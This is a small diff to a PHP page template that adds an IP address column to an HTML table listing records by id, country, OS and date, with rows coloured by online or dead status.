@@ -4,6 +4,7 @@ $TEMPLATE['text'] = '<table class="table table-hover">
 						<tr>
 							<th>#</th>
 							<th>Country</th>
+							<th>IP</th>
 							<th>OS</th>
 							<th>Date</th>
 						</tr>';
@@ -17,6 +18,7 @@ while ($row = $stmt->fetch())
 	$TEMPLATE['text'] .= "			<tr style=\"color: ".($row['online'] ? "green" : ($row['dead'] ? "gray" : "red")).";\">
 										<td>{$row['id']}</td>
 										<td>{$row['country']}</td>
+										<td>{$row['IP']}</td>
 										<td>{$row['OS']}</td>
 										<td>{$row['date']}</td>
 									</tr>";
